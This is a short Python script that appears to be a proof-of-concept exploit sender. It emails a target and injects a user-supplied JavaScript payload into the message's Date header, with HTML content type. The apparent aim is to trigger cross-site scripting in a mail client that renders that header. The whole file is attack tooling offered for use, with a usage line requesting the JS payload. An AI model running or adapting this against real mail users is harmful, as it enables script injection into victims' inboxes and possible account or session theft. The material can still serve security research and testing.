#!/usr/bin/python3
import smtplib
import os
import sys

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def sendMail(dstemail, frmemail, smtpsrv, payload):
    msg = "From: " + frmemail + "\n"
    msg += "To: " + dstemail + "\n"
    msg += "Date: " + payload + "\n"
    msg += "Subject: HELLO!\n"
    msg += "Content-type: text/html\n\n"
    msg += "Is it me you're looking for?..."
    msg += "\r\n\r\n"

    server = smtplib.SMTP(smtpsrv)

    try:
        server.sendmail(frmemail,dstemail,msg)
        print("[+] Email sent!")
    except Exception as e:
        print("[!] Failed to send email:")
        print("[!] " + str(e))

    server.quit()

# Main
def main(argv):
    if len(sys.argv) != 5:
        print("[*] Usage: " + sys.argv[0] + " <frm_mail> <dst_mail> <server> <js payload>\n")
        exit(-1)

    # Variables
    frmemail = sys.argv[1]
    dstemail = sys.argv[2]
    smtpsrv = sys.argv[3]
    payload = sys.argv[4]

    try:
        sendMail(dstemail,frmemail, smtpsrv, payload)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
